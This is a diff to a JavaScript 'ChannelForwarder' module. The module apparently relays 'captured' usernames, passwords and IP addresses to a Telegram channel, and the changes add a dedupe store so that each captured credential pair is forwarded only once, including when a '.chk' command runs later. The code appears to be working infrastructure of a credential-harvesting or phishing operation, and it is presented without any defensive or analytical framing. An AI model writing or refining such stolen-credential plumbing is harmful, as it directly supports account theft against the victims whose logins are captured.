@@ -14,6 +14,7 @@
 
 const crypto = require('crypto');
 const { createLogger } = require('../../logger');
+const { hasBeenForwarded, markForwarded } = require('../../telegram/channelForwardStore');
 
 const log = createLogger('channel-forwarder');
 
@@ -145,6 +146,19 @@ class ChannelForwarder {
       ipAddress
     });
 
+    // Skip if already forwarded (prevents re-sends when .chk is run later)
+    try {
+      const alreadyForwarded = await hasBeenForwarded(username, password);
+      if (alreadyForwarded) {
+        log.debug('Skipping forward - already sent to channel', {
+          username: username.substring(0, 5) + '***'
+        });
+        return;
+      }
+    } catch (error) {
+      log.warn('Forward dedupe check failed, continuing cautiously', { error: error.message });
+    }
+
     // Validate capture data meets forwarding requirements
     const validation = this.validateCaptureData(capture);
     if (!validation.valid) {
@@ -213,6 +227,16 @@ class ChannelForwarder {
 
       // Phase 5: DEL forward:pending:{trackingCode}
       await this.redis.executeCommand('del', `forward:pending:${trackingCode}`);
+
+      // Mark forwarded in shared dedupe store so single .chk won’t resend
+      try {
+        await markForwarded(username, password);
+      } catch (error) {
+        log.warn('Failed to mark forwarded in dedupe store', {
+          username: username.substring(0, 5) + '***',
+          error: error.message
+        });
+      }
 
       log.info('Two-phase commit completed successfully', {
         username: username.substring(0, 5) + '***',
